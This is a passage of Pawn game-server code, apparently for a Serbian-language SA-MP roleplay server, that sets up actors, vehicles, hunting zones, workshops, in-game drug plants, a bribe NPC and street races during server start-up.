    bankaHackingZona = CreateDynamicRectangle(1395.4002075195312, -1185.6001281738281, 1509.4002075195312, -1067.6001281738281, -1, -1, -1, 0);

    //Ucitavanje uniforma poslova
    for(new job = 0; job < MAX_JOBS; job++) {

        if(jobsInfos[job][jUniforma][0] != 0) {

            new string[128];
            format(string, sizeof(string), ""SRVBOJA1SCM"Posao %s\nDa uzmete/ostavite uniformu kucajte\n"col_white"[ /uniforma ]", jobsInfos[job][jName]);
            Create3DandP(string, jobsInfos[job][jUniforma][0], jobsInfos[job][jUniforma][1], jobsInfos[job][jUniforma][2], -1, -1, 1275, 2.0 );
        }
    }

    //BANKA
    KreirajSefBanka();

    KreirajNovac();

    BankaCuvar = CreateActor(163, 1008.5363,1882.8649,1202.2400,236.7372); //Cuvar Banka
    SetActorInvulnerable(BankaCuvar, 0);

    //////////////////////////////////////// Dinamicne Nargile

    for(new nargila; nargila < sizeof(NargilaInfo); nargila++) {
        new nargilaFile[ 50 ];
        format(nargilaFile, sizeof( nargilaFile ), "/Nargile/%d.ini", nargila);
        if(fexist(nargilaFile)) {
            INI_ParseFile(nargilaFile, "OcitajNargilu", .bExtra = true, .extra = nargila);
            NargilaInfo[ nargila ][ nargilaID ] = CreateDynamicObject(2726, NargilaInfo[ nargila ][ nargilaPosX ], NargilaInfo[ nargila ][ nargilaPosY ], NargilaInfo[ nargila ][ nargilaPosZ ], NargilaInfo[ nargila ][ nargilaRotX ], NargilaInfo[ nargila ][ nargilaRotY ], NargilaInfo[ nargila ][ nargilaRotZ ]);
            NargilaLabel[ nargila ] = Create3DTextLabel("/nargila\nNije iznamljena.", 0xFFFFFFFF, NargilaInfo[ nargila ][ nargilaPosX ], NargilaInfo[ nargila ][ nargilaPosY ], NargilaInfo[ nargila ][ nargilaPosZ ], 10.0, 0, 0);
            NargilaInfo[ nargila ][ IznajmioNargilu ] = -1;
        }
    }

    //////////////////////////////////////// BALON I OSTRVO

    balonObjekat = CreateObject(19333, 1260.83813, -2667.30005, 0.26836,   0.00000, 0.00000, 19.02249);
    balonPozicija = 0;
    defer balonPomeranje(balonPozicija);

    ////////////////////////// VOJNIK 2 by V01D

    vojnik2EnemyT1 = CreateActor(287, -704.5834,2293.1313,130.3154,4.4610);
    SetActorInvulnerable(vojnik2EnemyT1, 0);

    vojnik2EnemyT2 = CreateActor(287, -669.4922,2325.2224,136.1692,36.6838);
    SetActorInvulnerable(vojnik2EnemyT2, 0);

    vojnik2Enemy1 = CreateActor(287, -340.2792,2220.6592,42.4815,103.7651);
    SetActorInvulnerable(vojnik2Enemy1, 0);

    vojnik2Enemy2 = CreateActor(287, -373.5531,2234.0632,42.4844,196.2950);
    SetActorInvulnerable(vojnik2Enemy2, 0);

    vojnik2Enemy3 = CreateActor(287, -417.1202,2226.5022,47.0411,36.0843);
    SetActorInvulnerable(vojnik2Enemy3, 0);

    vojnik2Boss = CreateActor(272, -408.5094,2211.8567,42.4297,22.1038);
    SetActorInvulnerable(vojnik2Boss, 0);

    vojnik2Pomocni = CreateActor(295, -408.9155,2214.8167,42.4297,199.0428); //Pomocni actor

    vojnik2Veh1 = CreateVehicle(451, -412.8941,2214.2349,42.4297,204.0561, 0, 0, 0, 0);
    ResetVehicleStatistics(vojnik2Veh1);
    SetVehicleParamsEx(vojnik2Veh1, 0, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0);

    vojnik2Veh2 = CreateVehicle(506, -405.1833,2220.5981,42.4297,243.6090, 0, 0, 0, 0);
    ResetVehicleStatistics(vojnik2Veh2);
    SetVehicleParamsEx(vojnik2Veh2, 0, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0);

    ///////////////////////////////////////////

    CreateActor(180, 1865.4641,-1396.7059,13.4901,280.4126); //SkatePark Actor

    pornoActor = CreateActor(18, 793.7798,-1312.4838,710.4055,271.3022);

    defer timerForAnimPorno();

    KrevetUpotreba = false;

    new huntingZone = CreateDynamicRectangle( -319.388916015625, -1419.27783203125, -162.388916015625, -1313.27783203125);

    Hunting::Create(HUNTING_TYPE_COW, -203.1479,-1362.7095,5.5072, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_COW, -295.1039,-1391.6361,11.3014, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_COW, -268.8832,-1384.5386,10.7155, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_COW, -228.1823,-1370.4675,8.3305, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_COW, -221.8368,-1335.7740,10.6485, 55.0, 30, .moving_area=huntingZone);
    
    Hunting::Create(HUNTING_TYPE_DEER, -241.3715,-1317.4904,10.3134, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_DEER, -274.4238,-1326.7762,8.4144, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_DEER, -304.5617,-1341.3634,8.1949, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_DEER, -285.1408,-1372.7361,9.6336, 55.0, 30, .moving_area=huntingZone);
    Hunting::Create(HUNTING_TYPE_DEER, -192.3463,-1359.7061,4.7701, 55.0, 30, .moving_area=huntingZone);

    deoniceNewPrice();

    BrokerActor = CreateActor(113, 583.7122,-1259.1456,17.9459,107.6939);
    ApplyActorAnimation( BrokerActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );

    // koristiRampu = false;
    // CipRampa = CreateDynamicObject(19872, -2183.94556, 715.05060, 51.16970,   0.00000, 0.00000, 0.00000);

    misijaEnemy1 = CreateActor(173, 1483.0890,-1724.5442,6.7405,152.1874);
    ApplyActorAnimation( misijaEnemy1, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    SetActorInvulnerable(misijaEnemy1, 0);

    misijaEnemy2 = CreateActor(174, 1491.9631,-1705.0231,8.2542,325.9207);
    ApplyActorAnimation( misijaEnemy2, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    SetActorInvulnerable(misijaEnemy2, 0);

    misijaEnemy3 = CreateActor(175, 1489.7394,-1695.7144,8.2542,74.9616);
    ApplyActorAnimation( misijaEnemy3, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    SetActorInvulnerable(misijaEnemy3, 0);

    misijaPDActor = CreateActor(281, 2446.3269,-2023.6095,13.5469,312.7606);
    ApplyActorAnimation( misijaPDActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    SetActorInvulnerable(misijaPDActor, 0);

    misijaActor1 = CreateActor(282, 2103.9805,-1940.5629,13.5469,335.9474);
    ApplyActorAnimation( misijaActor1, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );

    //WorkShop Load
    for(new id = 0; id < MAX_WORKSHOPS; id++)
    {
        new wFile[40], string[180];
        format(wFile, 40, WorkShop_File, id);
        if(fexist(wFile))
        {
            INI_ParseFile(wFile, "LoadWorkShops", .bExtra = true, .extra = id);

            WorkShopVehicleCheck(id);

            if(strcmp( WorkShopInfo[id][wVlasnik], "Niko", true ))
            {
                format(string, 180, ""col_red"[ "col_white"WORKSHOP"col_red" ]\nVlasnik: "col_white"%s\n"col_red"ID: "col_white"%d"col_red"\nKoristite 'F' Za Ulaz", WorkShopInfo[id][wVlasnik], id);
            }
            else if(!strcmp( WorkShopInfo[id][wVlasnik], "Niko", true ))
            {
                format(string, 180, ""col_green"[ "col_white"WORKSHOP"col_green" ]\nVlasnik: "col_white"%s\n"col_green"ID: "col_white"%d"col_green"\n"col_green"Cena: "col_white"%d"col_green"\n/kupiradionicu", WorkShopInfo[id][wVlasnik], id, RadionicaBuyPrice);
            }
            WorkShopLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            WorkShopPickup[id] = CreateDynamicPickup(19524, 1, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ], -1, -1, -1, 30.0, -1, 0);
        }
    }

    CreateWarMaps();

    //Weapon Cycle Attach
    timer = SetTimer("AttachWeapon", TIME, 1);

    //BitCoinWorkShop Load

    for(new f = 0; f < sizeof(BitcoinInfo); f++)
    {
        new fFile[80], string[220];
        format(fFile, 80, BITCOIN_FILE, f);
        if(fexist(fFile))
        {
            INI_ParseFile(fFile, "UcitajBTCWorkShop", .bExtra = true, .extra = f);
            if(strcmp( BitcoinInfo[f][bVlasnik], "Niko", true )) {

                format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"%s\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Klikni F za ulaz", BitcoinInfo[f][bVlasnik], f);
                BitCoinLabel[f] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[f][bUlazX], BitcoinInfo[f][bUlazY], BitcoinInfo[f][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                BitCoinPickup[f] = CreateDynamicPickup(1272, 1, BitcoinInfo[f][bUlazX], BitcoinInfo[f][bUlazY], BitcoinInfo[f][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

                BitCoinSafeLabel[f] = CreateDynamic3DTextLabel(""SRVBOJA1SCM"Da pristupite BitCoin Serveru\n"col_white"[ /btcserver ]", 0x33CCFFAA, 2294.5474,-1786.3489,1600.7520, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, f, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);

            }
            else if(!strcmp( BitcoinInfo[f][bVlasnik], "Niko", true )) {

                format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"NIKO\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Cena: "col_white"%d$\n"SRVBOJA1SCM"Da kupis bitcoin workshop koristi /kupiworkshop", f, BTCWORKSHOP_PRICE);
                BitCoinLabel[f] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[f][bUlazX], BitcoinInfo[f][bUlazY], BitcoinInfo[f][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                BitCoinPickup[f] = CreateDynamicPickup(18631, 1, BitcoinInfo[f][bUlazX], BitcoinInfo[f][bUlazY], BitcoinInfo[f][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
            }
        }
    }

    ////////////////////////////////////////////////////////// 

    KranObjekat = CreateObject(1388, 2795.88623, -2395.16235, 33.38360,   0.00000, 0.00000, 320.00000);
    KranPozicija = 320;
    KranUpotreba = false;

    MuzejTimerTDKreiraj();

    //Plantaze Sistem
    new plant_number = random(sizeof(BiljkePozicije));

    PlantNumber[0] = plant_number;
    PlantObj[0] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[0] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[1] = plant_number;
    PlantObj[1] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[1] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[2] = plant_number;
    PlantObj[2] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[2] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[3] = plant_number;
    PlantObj[3] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[3] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[4] = plant_number;
    PlantObj[4] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[4] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[5] = plant_number;
    PlantObj[5] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[5] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[6] = plant_number;
    PlantObj[6] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[6] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[7] = plant_number;
    PlantObj[7] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[7] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[8] = plant_number;
    PlantObj[8] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[8] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[9] = plant_number;
    PlantObj[9] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[9] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[10] = plant_number;
    PlantObj[10] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[10] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[11] = plant_number;
    PlantObj[11] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[11] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[12] = plant_number;
    PlantObj[12] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[12] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[13] = plant_number;
    PlantObj[13] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[13] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[14] = plant_number;
    PlantObj[14] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[14] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[15] = plant_number;
    PlantObj[15] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[15] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[16] = plant_number;
    PlantObj[16] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[16] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[17] = plant_number;
    PlantObj[17] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[17] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[18] = plant_number;
    PlantObj[18] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[18] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    plant_number = random(sizeof(BiljkePozicije));
    PlantNumber[19] = plant_number;
    PlantObj[19] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[19] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    ////////////////////////////////////////////
    //Bribe sistem
    new bribe = random(sizeof(BribePozicije));
    if(BribeTrenutni == bribe) {

        bribe = random(sizeof(BribePozicije));
    }

    BribeTrenutni = bribe;
    BribeActor = CreateActor(282, BribePozicije[bribe][0], BribePozicije[bribe][1], BribePozicije[bribe][2], BribePozicije[bribe][3]);
    ApplyActorAnimation( BribeActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    BribeLabel = CreateDynamic3DTextLabel(""col_white"Da podmitite policajca kucajte\n"SRVBOJA1SCM"[ /bribe ]", -1, BribePozicije[bribe][0], BribePozicije[bribe][1], BribePozicije[bribe][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    SetVehiclePassengerDamage(true);
    SetDisableSyncBugs(true);

	//Sneg po putu
	//AddSnowObjects(); //Ako zelite sneg po ulicama obrisite komentar na liniji

    //FBI pod
    //CreateObject(19531, 948.05109, -1462.13281, 11.16810,   0.00000, 0.00000, 0.00000);

    // EnemyActor1 = FCNPC_Create("Enemy1");
    // FCNPC_Spawn(EnemyActor1, 287, 222.6090,1899.6664,17.6481);
    // FCNPC_SetWeapon(EnemyActor1, 31);
    // FCNPC_SetAmmo(EnemyActor1, 9999999);
    // FCNPC_SetAmmoInClip(EnemyActor1, 5);
    // FCNPC_SetHealth(EnemyActor1, 100.0);
    // FCNPC_SetInvulnerable(EnemyActor1, false);

    // EnemyActor2 = FCNPC_Create("Enemy2");
    // FCNPC_Spawn(EnemyActor2, 287, 246.3216,1843.0695,8.7578);
    // FCNPC_SetWeapon(EnemyActor2, 31);
    // FCNPC_SetAmmo(EnemyActor2, 9999999);
    // FCNPC_SetAmmoInClip(EnemyActor2, 5);
    // FCNPC_SetHealth(EnemyActor2, 100.0);
    // FCNPC_SetInvulnerable(EnemyActor2, false);

    // ZlataraCuvar = FCNPC_Create("ZlataraActor");
    // FCNPC_Spawn(ZlataraCuvar, 163, 1096.7706,-1673.0735,13.5749);
    // FCNPC_SetWeapon(ZlataraCuvar, 24);
    // FCNPC_SetAmmo(ZlataraCuvar, 9999999);
    // FCNPC_SetHealth(ZlataraCuvar, 150.0);
    // FCNPC_SetInvulnerable(ZlataraCuvar, false);

    // PandurNPC = FCNPC_Create("PandurMichael");
    // FCNPC_Spawn(PandurNPC, 290, 2045.6342,-1643.1410,13.5469);
    // FCNPC_SetWeapon(PandurNPC, 24);
    // FCNPC_SetAmmo(PandurNPC, 9999999);
    // FCNPC_SetHealth(PandurNPC, 150.0);
    // FCNPC_SetInvulnerable(PandurNPC, false);

    // MichaelActor2 = CreateActor(29, 2012.1278,-1763.7977,17.3444,181.3982);
    // ApplyActorAnimation(MichaelActor2, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );

    EnemyActor1 = CreateActor(287, 222.6090,1899.6664,17.6481, 180.00);
    SetActorInvulnerable(EnemyActor1, 0);

    EnemyActor2 = CreateActor(287, 246.3216,1843.0695,8.7578, 180.00);
    SetActorInvulnerable(EnemyActor2, 0);

    ZlataraCuvar = CreateActor(163, 1096.7706,-1673.0735,13.5749, 180.00);
    SetActorInvulnerable(ZlataraCuvar, 0);

    ZlataraSef = CreateDynamicObject(19462,1108.269,-1675.543,11.984,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef, 0, 9525, "boigas_sfw", "GEwhite1_64", 0x00000000);

    ZlataraSef2 = CreateDynamicObject(18886,1107.312,-1675.508,14.565,-90.000,-90.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef2, 0, 10101, "2notherbuildsfe", "ferry_build14", 0x00000000);
    SetDynamicObjectMaterial(ZlataraSef2, 1, 18996, "mattextures", "sampblack", 0x00000000);

    ZidZlatara = CreateDynamicObject(19462,1118.961,-1677.724,10.354,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZidZlatara, 0, 10765, "airportgnd_sfse", "white", 0x00000000);

    ////////////////////

    StartnaLinijaUT = 0;
    //ULICNE TRKEEE AAAAAAAAAAAA
    UlicneTrkeActor = CreateActor(123, 1792.8724,-1927.1606,13.3891,348.2829);
    ApplyActorAnimation(UlicneTrkeActor, "PED", "XPRESSscratch", 4.0, 1, 1, 1, 0, 0);
    Create3DTextLabel("Ulicne Trke\n[ /ulicnetrke ]", -1, 1792.8724,-1927.1606,13.3891, 10.0, 0, 0);

    UlicneTrkeVozilo = CreateVehicle(451, 1789.6785,-1931.4539,13.0947,47.4442, 0, 0, 0, 0);
    ResetVehicleStatistics(UlicneTrkeVozilo);
    SetVehicleParamsEx(UlicneTrkeVozilo, 0, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0);

    UlicneTrkeVozilo2 = CreateVehicle(506, 1794.9952,-1928.3079,13.0929,349.5788, 0, 0, 0, 0);
    ResetVehicleStatistics(UlicneTrkeVozilo2);
    SetVehicleParamsEx(UlicneTrkeVozilo2, 0, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0);
    // Dinamicni Actori by V01D
    for(new ActorID = 0; ActorID < sizeof(ActorInfo); ActorID++) {

        new fFile[80];
        format(fFile, 80, ActorsFile, ActorID);
        if(fexist(fFile)) {

            INI_ParseFile(fFile, "UcitajActore", .bExtra = true, .extra = ActorID);
